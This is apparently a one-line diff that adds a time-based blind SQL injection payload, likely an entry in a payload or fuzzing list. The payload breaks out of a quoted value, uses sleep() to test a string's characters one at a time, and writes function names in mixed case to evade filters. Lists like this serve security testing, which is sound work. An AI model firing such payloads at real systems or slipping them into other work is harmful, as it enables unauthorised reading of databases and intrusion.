@@ -1,0 +1,1 @@
+1' and(sleep(if((select(aScii(suBstr('867546938',2,1)))=54),[wait_time],1)))#
